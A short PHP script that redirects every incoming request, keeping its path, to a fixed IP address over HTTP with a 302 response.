<?php
// Get the requested path from the URL
$requestedPath = $_SERVER['REQUEST_URI'];

// Define the base URL of your server
$serverBaseUrl = 'http://35.184.251.245';

// Build the full URL to redirect to
$redirectUrl = $serverBaseUrl . $requestedPath;

// Send the redirect header
header("Location: $redirectUrl", true, 302);
exit();
?>
